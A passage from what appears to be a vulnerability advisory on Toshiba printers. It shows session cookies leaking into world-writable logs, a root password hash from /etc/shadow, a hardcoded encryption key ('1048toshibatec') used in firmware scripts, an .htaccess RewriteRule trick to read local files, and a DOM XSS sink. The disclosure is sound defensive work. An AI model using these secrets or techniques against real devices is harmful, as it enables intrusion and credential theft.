http.log:[Thu May 30 17:29:08.209477 2023] [contentwebserver:debug] [pid 5113] ccontentwebserver.cpp(1130): [client 10.0.0.2:43384] CContentWebServer:: SessionID=[<font color=red>ContentWebServer_10.0.0.2.874eef7e817c9d053cbdc618d850ab61</font>]   ignoreSessionTimeout=[IgnoreSessionTimeout], referer: http://10.0.0.1:8080/
http.log:[Thu May 30 17:29:08.739761 2023] [contentwebserver:debug] [pid 5118] ccontentwebserver.cpp(1130): [client 10.0.0.2:43386] CContentWebServer:: SessionID=[<font color=red>ContentWebServer_10.0.0.2.874eef7e817c9d053cbdc618d850ab61</font>]   ignoreSessionTimeout=[IgnoreSessionTimeout], referer: http://10.0.0.1:8080/FrameIndex.html?v=1670282309ta
[...]
bash-4.1# grep -i cookie *
http.log:Utility::GetCookie sCookievalue=[]
http.log:[Thu May 30 12:49:00.729591 2023] [contentwebserver:error] [pid 5121] [client 10.0.0.2:50619] [utility.cpp : 563] In SetCookie:: NO cookieInfo sent
http.log:[Thu May 30 12:49:00.729632 2023] [contentwebserver:error] [pid 5121] [client 10.0.0.2:50619] [utility.cpp : 594] In SetCookie::cookiebuf <font color=red>10.0.0.2.289d834d7086d004ce9a710590e10be1</font>
http.log: Utility::GetCookie cookieName=[Session]
http.log:Utility::GetCookie sCookievalue=[]
http.log:[Thu May 30 14:08:17.935840 2023] [contentwebserver:error] [pid 5113] [client 10.0.0.3:62840] [utility.cpp : 563] In SetCookie:: NO cookieInfo sent
http.log:[Thu May 30 14:08:17.935870 2023] [contentwebserver:error] [pid 5113] [client 10.0.0.3:62840] [utility.cpp : 594] In SetCookie::cookiebuf <font color=red>10.0.0.3.117f8affdaee98da7f6c4d073bd2ab8d</font>
http.log: Utility::GetCookie cookieName=[Session]
http.log:Utility::GetCookie sCookievalue=[]
http.log:[Thu May 30 14:08:20.603084 2023] [contentwebserver:error] [pid 5118] [client 10.0.0.4.75:62843] [utility.cpp : 563] In SetCookie:: NO cookieInfo sent
http.log:[Thu May 30 14:08:20.603114 2023] [contentwebserver:error] [pid 5118] [client 10.0.0.4:62843] [utility.cpp : 594] In SetCookie::cookiebuf <font color=red>10.0.0.4.140ee80f33943e90ea27be3fc3c511fb</font>
http.log: Utility::GetCookie cookieName=[Session]
http.log:Utility::GetCookie sCookievalue=[]
</pre>

<p>We can list the files containing such authentication sessions:</p>
<ul>
<li>al/network/log/http*</li>
</ul>
<p>This file has insecure permissions allowing any user to retrieve the passwords and some files can be freely modified by any local attacker (or any remote attacker using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability):</p>
<p>Insecure log files:</p>
<pre>
bash-4.1# pwd
/ramdisk/al/network/log
bash-4.1# ls -la
total 184
drwxr-xr-x 6 root root        0 May 30 10:38 .
drwxr-xr-x 7 root root        0 May 30 10:39 ..
<font color=red>-rw-rw-rw-</font> 1 root trusted  1455 May 30 10:38 dibbler-client.log
<font color=red>-rw-rw-rw-</font> 1 root trusted 23051 May 30 16:48 hp9100.log.0.txt
<font color=red>-rw-rw-rw-</font> 1 root trusted 58886 May 30 17:29 http.log
<font color=red>-rw-rw-rw-</font> 1 root trusted  6143 May 30 17:29 http_access.log
<font color=red>-rw-rw-rw-</font> 1 root trusted  9194 May 30 14:08 https.log
<font color=red>-rw-rw-rw-</font> 1 root trusted   962 May 30 15:01 lprng.log.0.txt
-rw-r----- 1 root adm      8767 May 30 16:38 maillog
<font color=red>-rw-rw-rw-</font> 1 root trusted 58619 May 30 17:23 nqlog.log
drwxrwxrwx 2 root trusted     0 May 30 10:38 wsd
drwxrwxrwx 2 root trusted     0 May 30 10:38 wsm
drwxrwxrwx 2 root trusted     0 May 30 10:38 wsp
drwxrwxrwx 2 root trusted     0 May 30 10:38 wsscn
</pre>

<p>An attacker can retrieve authentication sessions.</p>
<p>A remote attacker can retrieve the credentials and bypass the authentication mechanism by uploading a .htaccess file containing a RewriteRule (<code>RewriteRule /pwned.txt file:/path/to/local/file</code>), using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability.</p>
<p><a id="hardcoded-root-password"></a></p>
<h2>Details - Hardcoded root password</h2>
<p>All the Toshiba printers share the same hardcoded root password. This hardcoded password is written by default in the firmware image and cannot be modified. Furthermore, the hash was also found in firmware images from 2017, meaning this password was never updated:</p>
<p>Content of <code>/etc/shadow</code>:</p>
<pre><code>bash-4.1# cat /etc/shadow
root:$6$rsDekYom2xF0b$T./E5cKsgXixcqB6ULMv1f1/AztBn86Lt7Uv1MTS7LynR325iUIb9ql2A0UCHUzPLavlPnfsi/gOoJTosjo230:11323:0:99999:7:::
bin:!!:12571:0:99999:7:::
daemon:!!:12571:0:99999:7:::
adm:!!:12571:0:99999:7:::
lp:!!:12571:0:99999:7:::
sync:!!:12571:0:99999:7:::
shutdown:!!:12571:0:99999:7:::
halt:!!:12571:0:99999:7:::
mail:!!:12571:0:99999:7:::
uucp:!!:12571:0:99999:7:::
operator:!!:12571:0:99999:7:::
games:!!:12571:0:99999:7:::
gopher:!!:12571:0:99999:7:::
ftp:!!:12571:0:99999:7:::
hacluster:!!:12571:0:99999:7:::
rpcuser:!!:12571:0:99999:7:::
ntp:!!:12571:0:99999:7:::
smmsp:!:19431:0:99999:7:::
vcsa:!!:12571:0:99999:7:::
sshd:!!:12571:0:99999:7:::
nobody:!!:12571:0:99999:7:::
nfsnobody:!!:12571:0:99999:7:::
uuidd:x:19431:0:99999:7:::
messagebus:!:19431::::::
apache:!:19431:0:99999:7:::
sh-4.1#
</code></pre>
<p>An attacker can remotely compromise any Toshiba printer if the telnetd or the openssh servers are running.</p>
<p><a id="harcoded-password-logs"></a></p>
<h2>Details - Hardcoded password used to encrypt logs</h2>
<p>It was observed that all the Toshiba printers contain a shell script using the same hardcoded key to encrypt logs.</p>
<p>The script <code>/home/SYSROM_SRC/build/common/bin/encrypt_backup_log.sh</code> has insecure permissions and contains the hardcoded key <code>1048toshibatec</code>:</p>
<p>Insecure permissions of <code>/home/SYSROM_SRC/build/common/bin/encrypt_backup_log.sh</code>:</p>
<pre>
bash-4.1# ls -la /home/SYSROM_SRC/build/common/bin/encrypt_backup_log.sh
<font color=red>-rwxrwxrwx</font> 1 root root 95309 Nov  8  2021 /home/SYSROM_SRC/build/common/bin/encrypt_backup_log.sh
bash-4.1#
</pre>

<p>Content of the file:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">[</span>...<span style="color: #666666">]</span>
<span style="color: #666666">1908</span> <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;Start Collected Log Encryption&quot;</span>
<span style="color: #666666">1909</span> openssl enc -e -aes256 -in <span style="color: #19177C">$MOUNTPOINT</span>/<span style="color: #19177C">$SERIAL</span>.<span style="color: #19177C">$date</span>.tar.gz -out <span style="color: #19177C">$MOUNTPOINT</span>/<span style="color: #19177C">$SERIAL</span>.<span style="color: #19177C">$date</span> -k 1048toshibatec
<span style="color: #666666">1910</span> <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">[</span> <span style="color: #19177C">$?</span> -eq <span style="color: #666666">1</span> <span style="color: #666666">]</span>; <span style="color: #008000; font-weight: bold">then</span>
<span style="color: #666666">1911</span>      <span style="color: #008000">exit</span> <span style="color: #666666">1</span>     
<span style="color: #666666">1912</span> <span style="color: #008000; font-weight: bold">fi</span>
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
</pre></div>

<p>An attacker can decrypt the encrypted files using the hardcoded key.</p>
<p><a id="harcoded-password-logs-weak-cipher"></a></p>
<h2>Details - Hardcoded password used to encrypt logs and use of a weak digest cipher</h2>
<p>It was observed that all the Toshiba printers contain a shell script using the same hardcoded key to encrypt logs.</p>
<p>The script <code>/home/SYSROM_SRC/build/common/bin/CreateDebugLog.sh</code> has insecure permissions and contains the hardcoded key <code>1048toshibatec</code>:</p>
<p>Insecure Permissions of <code>/home/SYSROM_SRC/build/common/bin/CreateDebugLog.sh</code>:</p>
<pre>
bash-4.1# ls -la /home/SYSROM_SRC/build/common/bin/CreateDebugLog.sh
<font color=red>-rwxrwxrwx</font> 1 root root 115474 Nov  8  2021 /home/SYSROM_SRC/build/common/bin/CreateDebugLog.sh
bash-4.1#
</pre>

<p>In this file, we can find several hardcoded keys and the insecure use of MD5 as a digest cipher (<code>-md md5</code>) to derivate the secret key: </p>
<p>Content of <code>/home/SYSROM_SRC/build/common/bin/CreateDebugLog.sh</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">1986</span> archiveLogECC<span style="color: #666666">()</span>
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
<span style="color: #666666">2002</span>                 <span style="color: #008000; font-weight: bold">if</span> ! openssl enc -e -aes256 -in <span style="color: #19177C">$DIRPREFIX</span>/<span style="color: #19177C">$SERIAL_NUMBER</span><span style="color: #BA2121">&#39;_&#39;</span>USR<span style="color: #BA2121">&#39;_&#39;</span>DBGLOG.tar.gz -out <span style="color: #19177C">$DIRPREFIX</span>/<span style="color: #19177C">$SERIAL_NUMBER</span><span style="color: #BA2121">&#39;_&#39;</span>USR<span style="color: #BA2121">&#39;_&#39;</span>DBGLOG -k 1048toshibatec; <span style="color: #008000; font-weight: bold">then</span>
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
<span style="color: #666666">2020</span>                 <span style="color: #008000; font-weight: bold">if</span> ! openssl enc -e -aes256 -in <span style="color: #19177C">$DIRPREFIX</span>/<span style="color: #19177C">$SERIAL_NUMBER</span><span style="color: #BA2121">&#39;_&#39;</span>USR<span style="color: #BA2121">&#39;_&#39;</span>SPLDATA.tar.gz -out <span style="color: #19177C">$DIRPREFIX</span>/<span style="color: #19177C">$SERIAL_NUMBER</span><span style="color: #BA2121">&#39;_&#39;</span>USR<span style="color: #BA2121">&#39;_&#39;</span>SPLDATA -k 1048toshibatec ; <span style="color: #008000; font-weight: bold">then</span>
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
<span style="color: #666666">2029</span> archiveLogEmail<span style="color: #666666">()</span>
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
<span style="color: #666666">2056</span>                 <span style="color: #008000; font-weight: bold">if</span> ! openssl enc -e -aes256 -in <span style="color: #19177C">$DIRPREFIX</span>/<span style="color: #19177C">$SERIAL_NUMBER</span><span style="color: #BA2121">&#39;_&#39;</span>USR<span style="color: #BA2121">&#39;_&#39;</span>DBGLOG.tar.gz -out <span style="color: #19177C">$DIRPREFIX</span>/<span style="color: #19177C">$SERIAL_NUMBER</span><span style="color: #BA2121">&#39;_&#39;</span>USR<span style="color: #BA2121">&#39;_&#39;</span>DBGLOG -k 1048toshibatec ;<span style="color: #008000; font-weight: bold">then</span>
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
<span style="color: #666666">2081</span>                 <span style="color: #008000; font-weight: bold">if</span> ! openssl enc -e -aes256 -in <span style="color: #19177C">$DIRPREFIX</span>/<span style="color: #19177C">$SERIAL_NUMBER</span><span style="color: #BA2121">&#39;_&#39;</span>USR<span style="color: #BA2121">&#39;_&#39;</span>SPLDATA.tar.gz -out <span style="color: #19177C">$DIRPREFIX</span>/<span style="color: #19177C">$SERIAL_NUMBER</span><span style="color: #BA2121">&#39;_&#39;</span>USR<span style="color: #BA2121">&#39;_&#39;</span>SPLDATA -k 1048toshibatec;<span style="color: #008000; font-weight: bold">then</span>
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
<span style="color: #666666">2426</span>     <span style="color: #008000; font-weight: bold">if</span> ! openssl enc -e -aes256 -in <span style="color: #19177C">$ENCRYPTED_FILE</span><span style="color: #BA2121">&quot;.tar.gz&quot;</span> -out <span style="color: #19177C">$ENCRYPTED_FILE</span> -k 1048toshibatec -md md5; <span style="color: #008000; font-weight: bold">then</span>
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
</pre></div>

<p>An attacker can decrypt the encrypted files using the hardcoded key.</p>
<p>The MD5 algorithm is insecure.</p>
<p><a id="harcoded-password-files"></a></p>
<h2>Details - Hardcoded password used to encrypt files</h2>
<p>It was observed that all the Toshiba printers have programs containing a hardcoded key used to encrypt files:</p>
<ul>
<li><code>/home/SYSROM_SRC/build/release/bin/alreportmanager</code></li>
<li><code>/home/SYSROM_SRC/build/release/bin/alusermgr</code></li>
</ul>
<p>These 2 programs use the hardcoded key <code>1048toshibatec</code> to generate files.</p>
<p>In the alreportmanager program, this key is used inside the <code>al::reporting::ReportGenerator::EncryptFile(std::string *a1, const char **a2, const char **a3)</code> method to encrypt files.</p>
<p>In the alusermgr program, this key is used in several methods to encrypt files. We can identify the references to his strings:</p>
<p><img alt="" src="images/2024-toshiba-xref-hardcoded-key-alusermgr.png" /></p>
<p>An attacker can decrypt the encrypted files using the hardcoded key.</p>
<p><a id="dom-xss"></a></p>
<h2>Details - DOM-based XSS present in the /js/TopAccessUtil.js file</h2>
<p>All the Toshiba printers provide a web interface that will load the <code>/js/TopAccessUtil.js</code> JavaScript file. This <code>/js/TopAccessUtil.js</code> JavaScript file contains insecure codes vulnerable to XSS and is loaded inside all the webpages provided by the printer:</p>
<p>Content of http://ip:8080/?MAIN=TOPACCESS:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #BC7A00">&lt;!DOCTYPE html&gt;</span>
&lt;<span style="color: #008000; font-weight: bold">html</span>&gt;
&lt;<span style="color: #008000; font-weight: bold">head</span>&gt;
&lt;<span style="color: #008000; font-weight: bold">meta</span> <span style="color: #7D9029">http-equiv</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;X-UA-Compatible&quot;</span> <span style="color: #7D9029">content</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;IE=Edge&quot;</span>&gt;
&lt;<span style="color: #008000; font-weight: bold">META</span> <span style="color: #7D9029">http-equiv</span><span style="color: #666666">=</span><span style="color: #BA2121">Content-Type</span> <span style="color: #7D9029">content</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;text/html; charset=windows-1252&quot;</span>&gt;
&lt;<span style="color: #008000; font-weight: bold">META</span> <span style="color: #7D9029">HTTP-EQUIV</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;cache-Control: private&quot;</span> <span style="color: #7D9029">CONTENT</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;NO-CACHE&quot;</span>&gt;
&lt;<span style="color: #008000; font-weight: bold">META</span> <span style="color: #7D9029">HTTP-EQUIV</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;PRAGMA&quot;</span> <span style="color: #7D9029">CONTENT</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;NO-CACHE&quot;</span>&gt;
    &lt;<span style="color: #008000; font-weight: bold">META</span> <span style="color: #7D9029">HTTP-EQUIV</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;Expires&quot;</span> <span style="color: #7D9029">CONTENT</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;1&quot;</span>&gt;
    &lt;<span style="color: #008000; font-weight: bold">link</span> <span style="color: #7D9029">rel</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;stylesheet&quot;</span> <span style="color: #7D9029">type</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;text/css&quot;</span> <span style="color: #7D9029">href</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;styles/style.css?v=1670278837ta&quot;</span>&gt;
    <span style="color: #408080; font-style: italic">&lt;!--&lt;title class=&quot;clsTitle1&quot;&gt;TopAccess&lt;/title&gt;--&gt;</span>
    &lt;<span style="color: #008000; font-weight: bold">script</span> <span style="color: #7D9029">language</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;javascript&quot;</span> <span style="color: #7D9029">type</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;text/javascript&quot;</span> <span style="color: #7D9029">src</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;/js/Cookies.js?v=1670278837ta&quot;</span>&gt;&lt;/<span style="color: #008000; font-weight: bold">script</span>&gt;
    &lt;<span style="color: #008000; font-weight: bold">script</span> <span style="color: #7D9029">language</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;javascript&quot;</span> <span style="color: #7D9029">type</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;text/javascript&quot;</span> <span style="color: #7D9029">src</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;/localization/Locale_languages_installed.js?v=1670278837ta&quot;</span>&gt;&lt;/<span style="color: #008000; font-weight: bold">script</span>&gt;
    &lt;<span style="color: #008000; font-weight: bold">script</span> <span style="color: #7D9029">language</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;javascript&quot;</span> <span style="color: #7D9029">type</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;text/javascript&quot;</span> <span style="color: #7D9029">src</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;/js/localization.js?v=1670278837ta&quot;</span>&gt;&lt;/<span style="color: #008000; font-weight: bold">script</span>&gt;
    &lt;<span style="color: #008000; font-weight: bold">SCRIPT</span> <span style="color: #7D9029">language</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;javascript&quot;</span> <span style="color: #7D9029">type</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;text/javascript&quot;</span> <span style="color: #7D9029">src</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;/js/AjaxReqRespHandler.js?v=1670278837ta&quot;</span>&gt;&lt;/<span style="color: #008000; font-weight: bold">SCRIPT</span>&gt;
    &lt;<span style="color: #008000; font-weight: bold">script</span> <span style="color: #7D9029">language</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;javascript&quot;</span> <span style="color: #7D9029">type</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;text/javascript&quot;</span>&gt;
    <span style="color: #008000; font-weight: bold">var</span> gblTopWindow;
    <span style="color: #008000; font-weight: bold">var</span> backspacePressed;
    <span style="color: #008000; font-weight: bold">var</span> subMenuLoaded <span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">false</span>;
    <span style="color: #008000; font-weight: bold">if</span>(location.href.indexOf(<span style="color: #BA2121">&quot;?MAIN=EFILING&quot;</span>) <span style="color: #666666">==</span> <span style="color: #666666">-1</span>){
        <span style="color: #008000">window</span>.opener <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">null</span>;
        gblTopWindow<span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">true</span>;
    }   
    &lt;/<span style="color: #008000; font-weight: bold">script</span>&gt;
    &lt;<span style="color: #008000; font-weight: bold">SCRIPT</span> <span style="color: #7D9029">language</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;javascript&quot;</span> <span style="color: #7D9029">type</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;text/javascript&quot;</span> <span style="color: #7D9029">src</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;/js/TopAccessUtil.js?v=1670278837ta&quot;</span>&gt;&lt;/<span style="color: #008000; font-weight: bold">SCRIPT</span>&gt;
    &lt;<span style="color: #008000; font-weight: bold">script</span> <span style="color: #7D9029">language</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;javascript&quot;</span> <span style="color: #7D9029">type</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;text/javascript&quot;</span>&gt;
</pre></div>

<p>The <code>/js/TopAccessUtil.js</code> file contains the vulnerable <code>getQueryStringValue()</code> function that will take arguments from the URL and will return them without any sanitization:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">565</span> <span style="color: #008000; font-weight: bold">function</span> getQueryStringValue(varname,locationType) {
 <span style="color: #666666">566</span>         <span style="color: #008000; font-weight: bold">try</span> {
 <span style="color: #666666">567</span>             <span style="color: #408080; font-style: italic">/* locationType is a param which has enumeration (&quot;parent&quot; &amp; &quot;self&quot; &amp; &quot;top&quot;)   */</span>
 <span style="color: #666666">568</span>             <span style="color: #008000; font-weight: bold">var</span> strloc <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;&quot;</span>;
 <span style="color: #666666">569</span>             <span style="color: #008000; font-weight: bold">if</span> (locationType <span style="color: #666666">==</span> <span style="color: #008000; font-weight: bold">null</span> <span style="color: #666666">||</span> locationType <span style="color: #666666">==</span> <span style="color: #BA2121">&quot;parent&quot;</span>){
 <span style="color: #666666">570</span>                 strloc <span style="color: #666666">=</span> parent.location.href;
 <span style="color: #666666">571</span>             }<span style="color: #008000; font-weight: bold">else</span> <span style="color: #008000; font-weight: bold">if</span> (locationType <span style="color: #666666">==</span> <span style="color: #BA2121">&quot;top&quot;</span>){
 <span style="color: #666666">572</span>                 strloc <span style="color: #666666">=</span> top.location.href;
 <span style="color: #666666">573</span>             }<span style="color: #008000; font-weight: bold">else</span> <span style="color: #008000; font-weight: bold">if</span> (locationType <span style="color: #666666">==</span> <span style="color: #BA2121">&quot;self&quot;</span>){
 <span style="color: #666666">574</span>                 strloc <span style="color: #666666">=</span> location.href;
 <span style="color: #666666">575</span>             }<span style="color: #008000; font-weight: bold">else</span> <span style="color: #008000; font-weight: bold">if</span> (locationType <span style="color: #666666">==</span> <span style="color: #BA2121">&quot;parent.parent&quot;</span>) {
 <span style="color: #666666">576</span>                 strloc <span style="color: #666666">=</span> parent.parent.location.href;
 <span style="color: #666666">577</span>             }
 <span style="color: #666666">578</span>             <span style="color: #008000; font-weight: bold">if</span>(strloc.indexOf(<span style="color: #BA2121">&quot;?&quot;</span>)<span style="color: #666666">==</span> <span style="color: #666666">-1</span> <span style="color: #666666">&amp;&amp;</span> strloc.indexOf(<span style="color: #BA2121">&quot;#&quot;</span>)<span style="color: #666666">==</span> <span style="color: #666666">-1</span>) {
 <span style="color: #666666">579</span>                 <span style="color: #408080; font-style: italic">//alert(&quot;Error: strVar is null in getQueryStringValue()&quot;)</span>
 <span style="color: #666666">580</span>             } <span style="color: #008000; font-weight: bold">else</span> {
 <span style="color: #666666">581</span>                 <span style="color: #008000; font-weight: bold">var</span> strVar <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;&quot;</span>;
 <span style="color: #666666">582</span>                 <span style="color: #008000; font-weight: bold">if</span>(strloc.indexOf(<span style="color: #BA2121">&quot;?&quot;</span>) <span style="color: #666666">!=</span> <span style="color: #666666">-1</span>)
 <span style="color: #666666">583</span>                     strVar <span style="color: #666666">=</span> strloc.split(<span style="color: #BA2121">&quot;?&quot;</span>);
 <span style="color: #666666">584</span>                 <span style="color: #008000; font-weight: bold">else</span>
 <span style="color: #666666">585</span>                     strVar <span style="color: #666666">=</span> strloc.split(<span style="color: #BA2121">&quot;#&quot;</span>);
 <span style="color: #666666">586</span>                 <span style="color: #008000; font-weight: bold">var</span> arrExpressions <span style="color: #666666">=</span> strVar[<span style="color: #666666">1</span>].split(<span style="color: #BA2121">&quot;&amp;&quot;</span>);
 <span style="color: #666666">587</span>                 <span style="color: #008000; font-weight: bold">if</span>(arrExpressions <span style="color: #666666">==</span> <span style="color: #008000; font-weight: bold">null</span>){
 <span style="color: #666666">588</span>                    <span style="color: #408080; font-style: italic">// alert(&quot;Error: arrExpressions is null in getQueryStringValue()&quot;)</span>
 <span style="color: #666666">589</span>                                 }
 <span style="color: #666666">590</span>                 <span style="color: #008000; font-weight: bold">var</span> arrVars <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">null</span>;
 <span style="color: #666666">591</span>                 <span style="color: #008000; font-weight: bold">for</span> (i<span style="color: #666666">=0</span>;i<span style="color: #666666">&lt;</span>arrExpressions.length;i<span style="color: #666666">++</span>) {
 <span style="color: #666666">592</span>                     arrVars <span style="color: #666666">=</span> arrExpressions[i].split(<span style="color: #BA2121">&quot;=&quot;</span>);
 <span style="color: #666666">593</span>                     <span style="color: #008000; font-weight: bold">if</span> (arrVars[<span style="color: #666666">0</span>] <span style="color: #666666">==</span> varname) {
 <span style="color: #666666">594</span>                         <span style="color: #408080; font-style: italic">//alert(&quot;inside getQueryStringValue fun&quot;+unescape(arrVars[1]));</span>
 <span style="color: #666666">595</span>                         <span style="color: #008000; font-weight: bold">return</span> unescape(arrVars[<span style="color: #666666">1</span>]);
 <span style="color: #666666">596</span>                     }
 <span style="color: #666666">597</span>                 }
 <span style="color: #666666">598</span>             }
 <span style="color: #666666">599</span>     
 <span style="color: #666666">600</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #BA2121">&quot;&quot;</span>;
 <span style="color: #666666">601</span>         } <span style="color: #008000; font-weight: bold">catch</span>(e){errHandler(e,<span style="color: #BA2121">&#39;getQueryStringValue()&#39;</span>,<span style="color: #BA2121">&#39;TopAccessUtil.js?v=1670278837ta&#39;</span>,<span style="color: #BA2121">&quot;&quot;</span>);<span style="color: #008000; font-weight: bold">return</span> <span style="color: #BA2121">&quot;&quot;</span>;}
 <span style="color: #666666">602</span>     }
</pre></div>

<p>For example, the webpage <code>/Administration/SystemUpdates/MoreUpdateDetails.html</code> uses the <code>getQueryStringValue()</code> function to display variables. Such variables can be controlled by an attacker to inject malicious JavaScript codes and steal the admin's session cookie:</p>
<p>Content of <code>/Administration/SystemUpdates/MoreUpdateDetails.html</code> with vulnerable codes on lines 46, 51 and 58:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> 31 &lt;<span style="color: #008000; font-weight: bold">FORM</span> <span style="color: #7D9029">NAME </span><span style="color: #666666">=</span> <span style="color: #BA2121">&quot;frmMoreUpdateDetails&quot;</span>&gt;
 32         &lt;<span style="color: #008000; font-weight: bold">TABLE</span> <span style="color: #7D9029">BORDER</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;0&quot;</span> <span style="color: #7D9029">cellspacing</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;6&quot;</span> <span style="color: #7D9029">cellpadding</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;0&quot;</span> <span style="color: #7D9029">width</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;100%&quot;</span>&gt;
 33                 &lt;<span style="color: #008000; font-weight: bold">TR</span> &gt;
 34                         &lt;<span style="color: #008000; font-weight: bold">TD</span> <span style="color: #7D9029">VALIGN</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;TOP&quot;</span> <span style="color: #7D9029">NOWRAP</span> <span style="color: #7D9029">colspan</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;2&quot;</span> <span style="color: #7D9029">style</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;FONT-WEIGHT: normal; FONT-SIZE: 16pt; COLOR: #6699FE; FONT-STYLE: normal; FONT-FAMILY: Arial, sans-serif; TEXT-DECORATION: none&quot;</span>&gt;
 35                                 &lt;<span style="color: #008000; font-weight: bold">script</span> <span style="color: #7D9029">type</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;text/javascript&quot;</span>&gt;<span style="color: #008000">document</span>.write(fnGetLocaleString(<span style="color: #BA2121">&quot;DUMMYRESID&quot;</span>,<span style="color: #BA2121">&quot;Update Details&quot;</span>));&lt;/<span style="color: #008000; font-weight: bold">script</span>&gt;
 36                         &lt;/<span style="color: #008000; font-weight: bold">TD</span>&gt;
 37                 &lt;/<span style="color: #008000; font-weight: bold">TR</span>&gt;
 38                 &lt;<span style="color: #008000; font-weight: bold">TR</span> &gt;
 39                         &lt;<span style="color: #008000; font-weight: bold">TD</span> <span style="color: #7D9029">VALIGN</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;TOP&quot;</span> <span style="color: #7D9029">NOWRAP</span> <span style="color: #7D9029">colspan</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;2&quot;</span>&gt;
 40                                 <span style="color: #999999; font-weight: bold">&amp;nbsp;</span>
 41                         &lt;/<span style="color: #008000; font-weight: bold">TD</span>&gt;
 42                 &lt;/<span style="color: #008000; font-weight: bold">TR</span>&gt;
 43                 &lt;<span style="color: #008000; font-weight: bold">TR</span>&gt;
 44                         &lt;<span style="color: #008000; font-weight: bold">TD</span> <span style="color: #7D9029">VALIGN</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;TOP&quot;</span> <span style="color: #7D9029">WIDTH </span><span style="color: #666666">=</span> <span style="color: #BA2121">&quot;30%&quot;</span> <span style="color: #7D9029">ALIGN</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;LEFT&quot;</span> <span style="color: #7D9029">style</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;FONT-SIZE:10pt;FONT-STYLE: normal; FONT-FAMILY: Arial, sans-serif;&quot;</span>&gt;
 45                                 &lt;<span style="color: #008000; font-weight: bold">B</span>&gt;&lt;<span style="color: #008000; font-weight: bold">script</span>&gt;
 <span style="color: #666666">46</span>                                         <span style="color: #008000">document</span>.write(getQueryStringValue(<span style="color: #BA2121">&quot;packageName&quot;</span>,<span style="color: #BA2121">&quot;self&quot;</span>));
 <span style="color: #666666">47</span>                                 &lt;/<span style="color: #008000; font-weight: bold">script</span>&gt;&lt;/<span style="color: #008000; font-weight: bold">B</span>&gt;
 48                         &lt;/<span style="color: #008000; font-weight: bold">TD</span>&gt;
 49                         &lt;<span style="color: #008000; font-weight: bold">TD</span> <span style="color: #7D9029">VALIGN</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;TOP&quot;</span> <span style="color: #7D9029">ALIGN</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;LEFT&quot;</span> <span style="color: #7D9029">style</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;FONT-SIZE:9pt;FONT-STYLE: normal; FONT-FAMILY: Arial, sans-serif;&quot;</span>&gt;
